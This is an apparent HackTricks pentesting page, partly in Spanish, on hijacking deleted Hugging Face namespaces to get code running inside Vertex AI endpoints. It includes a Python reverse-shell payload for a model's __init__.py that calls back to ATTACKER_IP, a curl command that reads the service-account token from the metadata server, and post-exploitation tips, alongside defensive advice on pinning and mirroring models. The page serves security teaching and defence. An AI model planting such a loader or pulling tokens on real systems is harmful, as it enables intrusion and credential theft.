# GCP - Vertex AI Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## Escenario

- Vertex AI Model Garden permite el despliegue directo de muchos modelos de Hugging Face (HF).
- Los identificadores de modelo de HF son Author/ModelName. Si un author/org en HF es eliminado, el mismo nombre de author puede ser re-registrado por cualquiera. Un atacante puede entonces crear un repo con el mismo ModelName en la ruta legacy.
- Pipelines, SDKs o catálogos cloud que obtienen por nombre solamente (sin pinning/integrity) descargarán el repo controlado por el atacante. Cuando el modelo se despliega, el loader code de ese repo puede ejecutarse dentro del contenedor del endpoint de Vertex AI, dando RCE con los permisos del endpoint.

Two common takeover cases on HF:
- Ownership deletion: La ruta antigua devuelve 404 hasta que alguien vuelve a registrar al author y publica el mismo ModelName.
- Ownership transfer: HF emite 307 redirects desde el antiguo Author/ModelName al nuevo author. Si el antiguo author es luego eliminado y re-registrado por un atacante, la cadena de redirects se rompe y el repo del atacante sirve en la ruta legacy.

## Identificando namespaces reutilizables (HF)

- Old author deleted: la página del author devuelve 404; la ruta del modelo puede devolver 404 hasta el takeover.
- Transferred models: la ruta del modelo antigua emite 307 al nuevo owner mientras el antiguo author existe. Si el antiguo author es posteriormente eliminado y re-registrado, la ruta legacy resolverá al repo del atacante.

Quick checks with curl:
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>
# 200 = exists, 404 = deleted/available

# Check old model path behavior
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 = redirect to new owner (transfer case)
# 404 = missing (deletion case) until someone re-registers
```
## Flujo de ataque de extremo a extremo contra Vertex AI

1) Descubrir espacios de nombres de modelos reutilizables que Model Garden lista como desplegables:
- Encontrar modelos HF en Vertex AI Model Garden que todavía aparecen como “verified deployable”.
- Verificar en HF si el autor original fue eliminado o si el modelo fue transferido y el autor anterior fue posteriormente eliminado.

2) Volver a registrar al autor eliminado en HF y recrear el mismo ModelName.

3) Publicar un repo malicioso. Incluir código que se ejecute al cargar el modelo. Ejemplos que comúnmente se ejecutan durante la carga de modelos en HF:
- Efectos secundarios en __init__.py del repo
- Código personalizado modeling_*.py o procesamiento referenciado por config/auto_map
- Rutas de código que requieren trust_remote_code=True en Transformers pipelines

4) Una implementación de Vertex AI del Author/ModelName legado ahora descarga el repo del atacante. El loader se ejecuta dentro del contenedor del endpoint de Vertex AI.

5) El payload establece acceso desde el entorno del endpoint (RCE) con los permisos del endpoint.

Fragmento de payload de ejemplo ejecutado en import (solo para demostración):
```python
# Place in __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # Or python -c exec ...

if os.environ.get("VTX_AI","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
Notas
- Los loaders del mundo real varían. Muchas integraciones de Vertex AI HF clonan e importan módulos del repo referenciados en la config del modelo (p. ej., auto_map), lo que puede desencadenar ejecución de código. Algunos usos requieren trust_remote_code=True.
- El endpoint suele ejecutarse en un contenedor dedicado con alcance limitado, pero es un punto de apoyo inicial válido para el acceso a datos y movimiento lateral en GCP.

## Post-Exploitation Tips (Vertex AI Endpoint)

Una vez que el código se esté ejecutando dentro del contenedor del endpoint, considera:
- Enumerar variables de entorno y metadatos en busca de credenciales/tokens
- Acceder a almacenamiento adjunto o a los artefactos del modelo montados
- Interactuar con Google APIs mediante la identidad de la cuenta de servicio (Document AI, Storage, Pub/Sub, etc.)
- Persistencia en el artefacto del modelo si la plataforma vuelve a descargar el repo

Enumerar metadatos de la instancia si son accesibles (depende del contenedor):
```bash
curl -H "Metadata-Flavor: Google" \
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
## Guía defensiva para usuarios de Vertex AI

- Fijar modelos por commit en HF loaders para prevenir reemplazos silenciosos:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- Replica modelos verificados de HF en un almacén/registro interno de artefactos de confianza y despliega desde allí.
- Escanea continuamente las bases de código y las configuraciones en busca de Author/ModelName codificados que hayan sido eliminados/transferidos; actualiza a los nuevos namespaces o fíjalos por commit.
- En Model Garden, verifica la procedencia del modelo y la existencia del autor antes del despliegue.

## Recognition Heuristics (HTTP)

- Autor eliminado: la página del autor 404; la ruta antigua del modelo 404 hasta la toma de control.
- Modelo transferido: la ruta antigua redirecciona 307 hacia el nuevo autor mientras el autor antiguo existe; si el autor antiguo luego es eliminado y re-registrado, la ruta antigua sirve contenido del atacante.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## Referencias cruzadas

- Ver la metodología más amplia y notas sobre la cadena de suministro:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## Referencias

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
